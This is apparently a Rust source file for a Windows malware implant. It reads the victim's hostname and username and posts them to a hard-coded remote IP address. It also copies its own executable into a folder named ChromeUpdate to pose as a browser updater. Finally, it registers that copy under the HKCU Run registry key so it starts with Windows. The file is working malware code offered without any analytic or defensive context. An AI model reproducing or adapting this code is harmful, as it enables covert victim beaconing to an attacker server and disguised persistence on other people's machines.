use winreg::{self, enums::{HKEY_CURRENT_USER, KEY_ALL_ACCESS, HKEY_LOCAL_MACHINE}};
use std::{env, io::Write};
use std::time::{SystemTime};
pub async fn create_id() ->Result<(String,String),Box<dyn std::error::Error>>{
    let hlm = winreg::RegKey::predef(HKEY_LOCAL_MACHINE);
    let comp_skey = hlm.open_subkey(r#"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"#)?;
    let hostname = comp_skey.get_value("ComputerName")?;
    let username = std::env::var("USERNAME")?;
    let client = reqwest::Client::new();
    let mut cl_body = std::collections::HashMap::new();
    

    cl_body.insert("id", hostname);
    cl_body.insert("username",username);
    let req = client.post("http://18.159.96.157:352/create");
    
    let req = req.json(&cl_body);

    req.send().await?;
    Ok((comp_skey.get_value("ComputerName")?,std::env::var("USERNAME")?))
}


pub fn create_env() ->Result<(),Box<dyn std::error::Error>> {
    let mut user_home = String::new();
    match env::var("USERPROFILE") {
        Ok(val) => {println!("{}",val);user_home = val;},
        Err(_e) => println!("Failed")
    }

    let cock_path = format!("{}\\ChromeUpdate",user_home);
    println!("{}",cock_path);

    std::fs::create_dir(cock_path.to_owned())?;

    let mut exec = std::fs::File::open(env::current_exe()?)?; 

    let mut dest_exec = std::fs::File::create(format!("{}\\chromeupdate.exe",cock_path))?;
    std::io::copy(&mut exec, &mut dest_exec)?;

    std::fs::File::create(format!("{}\\log.txt",cock_path))?.write(format!("{}",(((SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs() / 60) / 60 )/ 24)).as_bytes())?;

    Ok(())
}


pub fn check_startup() ->Result<bool,Box<dyn std::error::Error>>{
    let hkcu = winreg::RegKey::predef(HKEY_CURRENT_USER);



    let autorun_skey = hkcu.open_subkey_with_flags(r#"Software\Microsoft\Windows\CurrentVersion\Run"#,KEY_ALL_ACCESS)?;
    let uwu: String = autorun_skey.get_value("Chrome Update").unwrap_or("".to_string());
    if uwu == "" {
        return Ok(true);
    }

    Ok(false)
}


pub fn create_startup() ->Result<(),Box<dyn std::error::Error>>{
    let hkcu = winreg::RegKey::predef(HKEY_CURRENT_USER);

    let autorun_skey = hkcu.open_subkey_with_flags(r#"Software\Microsoft\Windows\CurrentVersion\Run"#,KEY_ALL_ACCESS)?;
    
    let mut user_home = String::new();
    match env::var("USERPROFILE") {
        Ok(val) => {println!("{}",val);user_home = val;},
        Err(_e) => println!("Failed")
    }

    let cock_path = format!("{}\\ChromeUpdate\\chromeupdate.exe",user_home);
    
    autorun_skey.set_value("Chrome Update",&cock_path)?;
    Ok(())
}